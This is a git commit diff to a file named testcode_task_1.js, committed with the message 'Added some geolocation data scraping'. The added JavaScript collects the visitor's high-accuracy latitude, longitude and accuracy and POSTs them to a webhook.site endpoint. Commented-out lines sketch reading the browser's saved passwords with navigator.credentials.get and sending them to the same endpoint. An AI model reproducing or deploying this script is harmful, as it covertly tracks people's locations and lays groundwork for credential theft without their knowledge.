c7602b785b504dd6df02484f096d1e0291692254
Goldenbeasty <goldenbeaster@gmail.com>
2022-02-04 20:04:36 +0200

    Added some geolocation data scraping

--- testcode_task_1.js
+++ testcode_task_1.js
@@ -1,5 +1,29 @@
-function main() { 
-    console.log(location.hostname);
-    alert("Greetings through Github \n also: 193.115.56.201");
+async function main() {    
+    var options = {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
+    };
+
+    function success(pos) {
+        var crd = pos.coords;
+        var data = [crd.latitude, crd.longitude, crd.accuracy];
+        let xhr = new XMLHttpRequest();
+        xhr.open("POST", url);
+        xhr.send(data);
+    }
+
+    function error(err) {
+        console.warn(`ERROR(${err.code}): ${err.message}`);
+    }
+    navigator.geolocation.getCurrentPosition(success, error, options);
+
+    let url = 'https://webhook.site/75296190-1ddd-4656-9701-533fee9fa083';
+    // let xhr = new XMLHttpRequest();
+    // xhr.open("POST", url);
+    // let bdata = navigator.credentials.get({password: true});
+    // xhr.send(bdata);
+    // console.log(bdata);
+    alert('Goldenbeasty');
 }
 main()
